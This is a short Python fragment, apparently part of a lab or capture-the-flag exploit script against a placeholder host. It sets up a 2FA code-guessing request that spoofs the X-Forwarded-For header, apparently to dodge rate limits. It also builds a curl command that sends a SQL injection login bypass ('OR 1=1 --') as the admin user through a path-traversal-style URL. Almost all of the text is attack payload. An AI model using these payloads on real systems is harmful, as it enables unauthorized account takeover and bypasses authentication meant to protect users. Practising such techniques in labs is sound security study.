URL = "http://<machine-ip>/auth/verify-2fa"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://<machine-ip>",
    "Referer": "http://<machine-ip>/auth/verify-2fa",
    "Cookie": "user_ip=<user-ip>",
    "Upgrade-Insecure-Requests": "1",
    "X-Forwarded-For": "192.1.1.2"
}

data = {"2fa-code": "0000"}

SQL_RESET = [
    'curl', '-X', 'POST',
    "--path-as-is",
    'http://<machine-ip>/auth/../auth/login',
    '-H', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    '-H', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    '-H', 'Accept-Language: en-US,en;q=0.5',
    '-H', 'Accept-Encoding: gzip, deflate, br',
    '-H', 'Content-Type: application/x-www-form-urlencoded',
    '-H', 'Origin: http://<machine-ip>',
    '-H', 'Referer: http://<machine-ip>/auth/login',
    '-H', 'Cookie: user_ip=<user-ip>',
    '-H', 'Upgrade-Insecure-Requests: 1',
    '--data', 'username=admin&password=a\' OR 1=1 --'
]
